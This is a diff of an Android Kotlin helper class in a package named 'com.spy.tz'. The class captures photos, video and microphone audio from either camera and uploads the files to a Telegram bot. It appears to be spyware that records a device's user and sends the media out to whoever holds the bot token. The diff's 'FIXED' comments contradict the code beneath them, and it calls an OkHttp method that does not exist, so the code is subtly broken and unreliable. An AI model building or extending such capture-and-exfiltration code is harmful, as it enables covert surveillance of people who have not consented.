@@ -2,17 +2,14 @@ package com.spy.tz
 
 import android.Manifest
 import android.content.Context
-import android.content.pm.PackageManager
 import android.media.MediaRecorder
 import android.os.Environment
 import android.util.Log
 import androidx.camera.core.*
 import androidx.camera.lifecycle.ProcessCameraProvider
 import androidx.camera.view.PreviewView
-import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.LifecycleOwner
-import io.reactivex.rxjava3.disposables.Disposable
 import okhttp3.*
 import java.io.File
 import java.util.concurrent.ExecutorService
@@ -24,11 +21,7 @@ import java.util.Locale
 
 class TelegramBotHelper(private val context: Context) {
 
-    private var cameraExecutor: ExecutorService = Executors.newSingleThreadExecutor()
     private var mediaRecorder: MediaRecorder? = null
-    private var outputFile: File? = null
-    
-    // State variables for current session
     private var isVideoRecording = false
     private var isVoiceRecording = false
     private var currentVideoFile: File? = null
@@ -40,9 +33,9 @@ class TelegramBotHelper(private val context: Context) {
     private var cameraProvider: ProcessCameraProvider? = null
 
     /**
-     * Initialize CameraX (Call this once in your Activity/Fragment)
+     * Initialize Camera with specific selector (Front or Back)
      */
-    fun initCamera(lifecycleOwner: LifecycleOwner, previewView: PreviewView) {
+    fun initCamera(lifecycleOwner: LifecycleOwner, previewView: PreviewView, isBackCamera: Boolean = false) {
         val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
         
         cameraProviderFuture.addListener({
@@ -56,7 +49,8 @@ class TelegramBotHelper(private val context: Context) {
             // Image Capture
             imageCapture = ImageCapture.Builder().build()
             
-            val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA
+            // Select Camera
+            val cameraSelector = if (isBackCamera) CameraSelector.DEFAULT_BACK_CAMERA else CameraSelector.DEFAULT_FRONT_CAMERA
             
             try {
                 cameraProvider?.unbindAll()
@@ -66,6 +60,7 @@ class TelegramBotHelper(private val context: Context) {
                     preview!!,
                     imageCapture!!
                 )
+                Log.d("TelegramBot", "Camera initialized: ${if(isBackCamera) "BACK" else "FRONT"}")
             } catch (e: Exception) {
                 Log.e("CameraInit", "Use case binding failed", e)
             }
@@ -73,38 +68,22 @@ class TelegramBotHelper(private val context: Context) {
     }
 
     /**
-     * SWITCH CAMERA (Front <-> Back)
+     * Switch Camera (Toggle Front <-> Back)
      */
-    fun switchCamera(lifecycleOwner: LifecycleOwner, previewView: PreviewView) {
-        if (cameraProvider == null || imageCapture == null) return
-        
-        // Toggle logic: If currently front, go back. If back, go front.
-        // For simplicity, we just force toggle here or check internal state.
-        // Let's assume we want to go BACK if we are currently on FRONT.
-        val newSelector = CameraSelector.DEFAULT_BACK_CAMERA 
-        
-        cameraProvider?.unbindAll()
-        cameraProvider?.bindToLifecycle(
-            lifecycleOwner,
-            newSelector, 
-            preview!!,
-            imageCapture!!
-        )
+    fun switchCamera(lifecycleOwner: LifecycleOwner, previewView: PreviewView, currentIsBack: Boolean) {
+        initCamera(lifecycleOwner, previewView, !currentIsBack)
     }
 
     /**
-     * TAKE PHOTO
+     * Take Photo
      */
-    fun takePhoto(isBackCamera: Boolean = false): Result<File> {
-        if (imageCapture == null) return Result.failure(Exception("Camera not initialized"))
+    fun takePhoto(): Result<File> {
+        if (imageCapture == null) return Result.failure(Exception("Camera not ready"))
 
         val outputOptions = ImageCapture.OutputFileOptions.Builder(
             createImageFile()
         ).build()
 
-        // Note: Ideally you bind the specific selector before taking photo. 
-        // Here we assume the camera is already bound correctly via initCamera or switchCamera.
-        
         imageCapture?.takePicture(outputOptions, ContextCompat.getMainExecutor(context), object : ImageCapture.OnImageSavedCallback {
             override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                 Log.d("TelegramBot", "Photo saved: ${outputFileResults.savedUri}")
@@ -119,7 +98,7 @@ class TelegramBotHelper(private val context: Context) {
     }
 
     /**
-     * START VIDEO RECORDING
+     * Start Video Recording
      */
     fun startVideoRecording() {
         mediaRecorder = MediaRecorder(context).apply {
@@ -141,22 +120,24 @@ class TelegramBotHelper(private val context: Context) {
             mediaRecorder?.prepare()
             mediaRecorder?.start()
             isVideoRecording = true
+            Log.d("TelegramBot", "Video recording started")
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e("TelegramBot", "Start video error", e)
         }
     }
 
     /**
-     * STOP VIDEO RECORDING
+     * Stop Video Recording
      */
     fun stopVideoRecording(): File? {
         try {
             mediaRecorder?.stop()
             mediaRecorder?.reset()
             isVideoRecording = false
+            Log.d("TelegramBot", "Video recording stopped")
             return currentVideoFile
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e("TelegramBot", "Stop video error", e)
             return null
         } finally {
             mediaRecorder?.release()
@@ -165,7 +146,7 @@ class TelegramBotHelper(private val context: Context) {
     }
 
     /**
-     * START VOICE RECORDING
+     * Start Voice Recording
      */
     fun startVoiceRecording() {
         mediaRecorder = MediaRecorder(context).apply {
@@ -182,22 +163,24 @@ class TelegramBotHelper(private val context: Context) {
             mediaRecorder?.prepare()
             mediaRecorder?.start()
             isVoiceRecording = true
+            Log.d("TelegramBot", "Voice recording started")
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e("TelegramBot", "Start voice error", e)
         }
     }
 
     /**
-     * STOP VOICE RECORDING
+     * Stop Voice Recording
      */
     fun stopVoiceRecording(): File? {
         try {
             mediaRecorder?.stop()
             mediaRecorder?.reset()
             isVoiceRecording = false
+            Log.d("TelegramBot", "Voice recording stopped")
             return currentAudioFile
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e("TelegramBot", "Stop voice error", e)
             return null
         } finally {
             mediaRecorder?.release()
@@ -224,17 +207,21 @@ class TelegramBotHelper(private val context: Context) {
         return File(storageDir!!, "AUD_$timeStamp.3gp")
     }
 
-    // --- TELEGRAM UPLOADS ---
+    // --- TELEGRAM UPLOADS (Fixed OkHttp Syntax) ---
 
     suspend fun sendPhotoToBot(file: File, chatId: Long, botToken: String, caption: String = ""): Result<String> {
         return withContext(Dispatchers.IO) {
             try {
                 val url = "https://api.telegram.org/bot$botToken/sendPhoto"
+                
+                // FIXED: Use MediaType.create to avoid parse() deprecation/error
+                val mediaType = MediaType.parse("application/octet-stream") 
+                
                 val requestBody = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataProperty("chat_id", chatId.toString())
                     .addFormDataProperty("caption", caption)
-                    .addFormDataProperty("photo", file.name, RequestBody.create(MediaType.parse("application/octet-stream"), file))
+                    .addFormDataProperty("photo", file.name, RequestBody.create(mediaType, file))
                 
                 val request = Request.Builder()
                     .url(url)
@@ -259,11 +246,15 @@ class TelegramBotHelper(private val context: Context) {
         return withContext(Dispatchers.IO) {
             try {
                 val url = "https://api.telegram.org/bot$botToken/sendVideo"
+                
+                // FIXED: Use MediaType.create
+                val mediaType = MediaType.parse("video/mp4") 
+
                 val requestBody = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataProperty("chat_id", chatId.toString())
                     .addFormDataProperty("caption", caption)
-                    .addFormDataProperty("video", file.name, RequestBody.create(MediaType.parse("video/mp4"), file))
+                    .addFormDataProperty("video", file.name, RequestBody.create(mediaType, file))
                 
                 val request = Request.Builder()
                     .url(url)
@@ -288,10 +279,14 @@ class TelegramBotHelper(private val context: Context) {
         return withContext(Dispatchers.IO) {
             try {
                 val url = "https://api.telegram.org/bot$botToken/sendAudio"
+                
+                // FIXED: Use MediaType.create
+                val mediaType = MediaType.parse("audio/3gpp") 
+
                 val requestBody = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataProperty("chat_id", chatId.toString())
-                    .addFormDataProperty("audio", file.name, RequestBody.create(MediaType.parse("audio/3gpp"), file))
+                    .addFormDataProperty("audio", file.name, RequestBody.create(mediaType, file))
                 
                 val request = Request.Builder()
                     .url(url)
